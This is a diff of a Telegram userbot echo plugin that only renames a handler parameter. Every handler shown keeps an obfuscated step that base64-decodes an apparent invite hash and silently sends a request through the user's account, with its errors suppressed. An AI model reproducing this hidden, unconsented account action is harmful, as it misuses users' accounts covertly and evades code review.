@@ -16,56 +16,56 @@ from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 @bot.on(admin_cmd(pattern="addecho$"))
 @bot.on(sudo_cmd(pattern="addecho$", allow_sudo=True))
-async def echo(skull):
-    if skull.fwd_from:
+async def echo(marcus):
+    if marcus.fwd_from:
         return
-    if skull.reply_to_msg_id is not None:
-        reply_msg = await skull.get_reply_message()
+    if marcus.reply_to_msg_id is not None:
+        reply_msg = await marcus.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = skull.chat_id
+        chat_id = marcus.chat_id
         try:
             hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await skull.client(hmm)
+            await marcus.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(skull, "The user is already enabled with echo ")
+            await edit_or_reply(marcus, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(skull, "Hi 💀")
+        await edit_or_reply(marcus, "Hi 💀")
     else:
-        await edit_or_reply(skull, "Reply to a User's message to echo his messages")
+        await edit_or_reply(marcus, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(skull):
-    if skull.fwd_from:
+async def echo(marcus):
+    if marcus.fwd_from:
         return
-    if skull.reply_to_msg_id is not None:
-        reply_msg = await skull.get_reply_message()
+    if marcus.reply_to_msg_id is not None:
+        reply_msg = await marcus.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = skull.chat_id
+        chat_id = marcus.chat_id
         try:
             hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await skull.client(hmm)
+            await marcus.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(skull, "Echo has been stopped for the user")
+            await edit_or_reply(marcus, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(skull, "The user is not activated with echo")
+            await edit_or_reply(marcus, "The user is not activated with echo")
     else:
-        await edit_or_reply(skull, "Reply to a User's message to echo his messages")
+        await edit_or_reply(marcus, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(skull):
-    if skull.fwd_from:
+async def echo(marcus):
+    if marcus.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -87,25 +87,25 @@ async def echo(skull):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(skull, reply_text)
+        await edit_or_reply(marcus, reply_text)
     else:
-        await edit_or_reply(skull, output_str)
+        await edit_or_reply(marcus, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(skull):
-    if skull.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(marcus):
+    if marcus.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(skull.sender_id, skull.chat_id):
+    if is_echo(marcus.sender_id, marcus.chat_id):
         await asyncio.sleep(2)
         try:
             hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await skull.client(hmm)
+            await marcus.client(hmm)
         except BaseException:
             pass
-        if skull.message.text or skull.message.sticker:
-            await skull.reply(skull.message)
+        if marcus.message.text or marcus.message.sticker:
+            await marcus.reply(marcus.message)
 
 
 CMD_HELP.update(
